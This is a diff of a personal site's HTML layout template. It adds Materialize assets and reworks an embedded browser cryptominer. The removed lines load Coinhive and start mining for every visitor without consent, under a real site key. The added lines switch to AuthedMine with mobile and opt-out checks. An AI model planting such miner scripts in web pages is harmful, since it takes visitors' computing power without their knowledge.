@@ -10,20 +10,20 @@
 
       gtag('config', 'UA-119302343-1');
     </script>
+
     <meta charset="UTF-8">
-    {% seo title=true %}
     <title>Dolcey Mendoza</title>
     <meta name="description" content="{{ page.description | default: site.description | default: site.github.project_tagline }}"/>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#11c3d0">
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:300' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-beta/css/materialize.min.css">
     <link rel="stylesheet" href="{{ '/assets/css/style.css?v=' | append: site.github.build_revision | relative_url }}">
     <link rel="shortcut icon" href="../assets/img/favicon.png" type="image/x-icon">
   </head>
   <body>
     <section class="page-header">
       <img src="../assets/img/logopositivo.png" style="width:16em">
-      <!-- <h1 class="project-name">{{ site.title | default: site.github.repository_name }}</h1> -->
       <h2 class="project-tagline">{{ site.description | default: site.github.project_tagline }}</h2>
       <div class="nav">
         <a href="/">Home</a>
@@ -39,15 +39,16 @@
       </footer>
     </section>
 
-    <!--Miner-->
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-    <!--<script src="https://authedmine.com/lib/authedmine.min.js"></script>-->
+    <!-- Miner -->
+    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
     <script>
       var miner = new CoinHive.Anonymous('g8gUNdWBNLwo5w0MNQ07Ovd3WhuPhsIn', {throttle: 0.3});
-      //if(!miner.isMobile()){
-        miner.start()
-      //}
+      if (!miner.isMobile() && !miner.didOptOut(14400)) {
+          miner.start();
+      }
     </script>
-
+    
+    <!-- Matearilze CSS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-beta/js/materialize.min.js"></script>
   </body>
 </html>
